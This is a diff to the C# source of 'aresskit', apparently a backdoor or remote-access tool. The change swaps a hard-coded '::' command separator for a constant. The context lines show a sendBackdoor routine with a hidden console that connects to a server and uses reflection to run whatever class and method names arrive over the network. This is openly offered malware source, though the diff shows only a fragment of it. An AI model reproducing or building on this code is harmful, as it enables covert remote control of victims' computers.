@@ -11,6 +11,7 @@ namespace aresskit
         const string server = "localhost";
         const int port = 9000;
         const bool hideConsole = true;
+        const string cmdSplitter = "::";
         
         private static void sendBackdoor(string server, int port)
         {
@@ -55,7 +56,7 @@ namespace aresskit
                     {
                         try
                         {
-                            if (!responseData.Contains("::"))
+                            if (!responseData.Contains(cmdSplitter))
                             {
                                 if (responseData != "")
                                     output = Misc.byteCode("'" + responseData.Replace("\n", "") + "' is not a recognized command.\n");
@@ -65,7 +66,7 @@ namespace aresskit
                                 responseData = responseData.Trim(); // To eliminate annoying things in the string
 
                                 // Will produce: (clas name), (method name), [arg](,)[arg]...
-                                string[] classMethod = responseData.Split(new[] { "::" }, StringSplitOptions.None);
+                                string[] classMethod = responseData.Split(new[] { cmdSplitter }, StringSplitOptions.None);
 
 
                                 Type methodType = Type.GetType("aresskit." + classMethod[0]); // Get type: aresskit.Class
@@ -74,7 +75,7 @@ namespace aresskit
                                 string[] methodData = classMethod[1].Split(new char[0]);
                                 MethodInfo methodInstance = methodType.GetMethod(methodData[0]);
                                 if (methodInstance == null)
-                                    output = Misc.byteCode("No such class/method with the name '" + classMethod[0] + "::" + classMethod[1] + "'");
+                                    output = Misc.byteCode("No such class/method with the name '" + classMethod[0] + cmdSplitter + classMethod[1] + "'");
                                 ParameterInfo[] methodParameters = methodInstance.GetParameters();
 
 
